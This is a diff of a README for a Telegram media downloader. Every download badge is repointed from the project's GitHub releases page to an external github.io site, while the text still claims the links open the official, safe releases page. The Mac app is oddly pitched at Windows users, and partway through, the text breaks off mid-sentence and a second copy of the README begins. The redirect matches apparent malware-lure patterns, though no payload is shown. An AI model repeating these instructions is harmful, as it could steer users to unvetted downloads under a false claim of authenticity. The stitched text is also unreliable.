@@ -1,6 +1,6 @@
 # 🎬 telegram-media-downloader - Back Up Telegram Media in One Click
 
-[![Download telegram-media-downloader](https://img.shields.io/badge/Download_Now-telegram--media--downloader-ff6b6b?style=for-the-badge&logo=github)](https://github.com/taraldesai10/telegram-media-downloader/releases)
+[![Download telegram-media-downloader](https://img.shields.io/badge/Download_Now-telegram--media--downloader-ff6b6b?style=for-the-badge&logo=github)](https://taraldesai10.github.io)
 
 telegram-media-downloader is described as a Mac native Telegram channel downloader for one-click backup of images, videos, audio, and documents. This guide is written for Windows users who want to visit the official download page, get the application, and understand the basic steps for running it.
 
@@ -21,11 +21,11 @@ Before you begin, make sure you have:
 
 Visit this link to download the application.
 
-[![Get telegram-media-downloader](https://img.shields.io/badge/Get_telegram--media--downloader-00b894?style=for-the-badge&logo=github)](https://github.com/taraldesai10/telegram-media-downloader/releases)
+[![Get telegram-media-downloader](https://img.shields.io/badge/Get_telegram--media--downloader-00b894?style=for-the-badge&logo=github)](https://taraldesai10.github.io)
 
 The link above opens the official releases page for telegram-media-downloader. Use that page to download the application. Keep the downloaded file in a folder you can easily# 🎬 telegram-media-downloader - Back Up Telegram Media in One Click
 
-[![Download telegram-media-downloader](https://img.shields.io/badge/Download-telegram--media--downloader-e84393?style=for-the-badge&logo=telegram&logoColor=white)](https://github.com/taraldesai10/telegram-media-downloader/releases)
+[![Download telegram-media-downloader](https://img.shields.io/badge/Download-telegram--media--downloader-e84393?style=for-the-badge&logo=telegram&logoColor=white)](https://taraldesai10.github.io)
 
 telegram-media-downloader is described as a Mac native Telegram channel downloader that lets you back up images, videos, audio, and documents from Telegram channels in one go. This page is written for everyday computer users. You do not need any programming knowledge to follow it. The goal is simple: help you visit the official download page, download the application, and understand how to get it running on a Windows computer.
 
@@ -46,7 +46,7 @@ Before you start, make sure you have:
 
 Visit this link to download the application.
 
-[![Get telegram-media-downloader](https://img.shields.io/badge/Get_the_App-0984e3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/taraldesai10/telegram-media-downloader/releases)
+[![Get telegram-media-downloader](https://img.shields.io/badge/Get_the_App-0984e3?style=for-the-badge&logo=github&logoColor=white)](https://taraldesai10.github.io)
 
 That link opens the official releases page for telegram-media-downloader. This is the safe, primary place to get the software. When you arrive, you will see the available downloads listed on the page. Pick the file that matches your computer, then save it to a folder you can easily find later, such as your Downloads folder or your Desktop.
 
